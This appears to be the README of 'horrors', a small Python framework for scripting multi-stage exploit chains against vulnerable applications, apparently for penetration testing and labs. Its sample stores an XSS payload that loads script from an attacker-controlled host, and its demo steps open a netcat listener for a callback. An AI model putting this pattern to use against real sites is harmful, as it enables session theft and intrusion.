# horrors

> A micro-framework for writing attack scenarios starring multiple vulnerabilities.

## About

This little asyncio-based framework was created in order to simplify exploit chain development for vulnerable applications. The `scenarios.Scenario` methods are executed sequentially. All you have to do is:

```python
class Vulnerable(scenarios.Scenario):

    async def stage1(self):
        requests.post(
            'http://{rhost}:{rport}/stored/'.format(**self.context),
            data='field=<script src=http://{lhost}:{lport}/xss.js></script>'.format(**self.context),
            headers={'Content-Type': 'application/x-www-form-urlencoded'}
        )

    async def stage2(self):
        await events.Event.wait('xss')
        res = requests.get(
            'http://{rhost}:{rport}/userid/{username}'.format(**self.context)
        )

httpd = services.HTTPStatic({
    '/': 'Home',
    '/xss.js': 'var payload = "something_is_wrong_here";',
})
httpd.send('xss', when=triggers.PathContains('xss.js'))

story = Vulnerable(
    rhost='127.0.0.1',
    rport=8008,
    lhost='127.0.0.1',
    lport=8888,
    username='evil',
)
story.spawn(httpd)
story.play()
```

## Installation

    $ git clone https://github.com/tasooshi/horrors
    $ cd horrors; pip3 install .

## Example

A full example is included in the `horrors/example` directory. Try it out by running:

    $ nc -lv4 4444
    $ horrors/example/victim.py
    $ horrors/example/attacker.py

### Demo

[![example](https://img.youtube.com/vi/VQwysZItPrE/0.jpg)](https://www.youtube.com/watch?v=VQwysZItPrE)

## Changelog

* **2021/07/30** Initial release (v0.1)
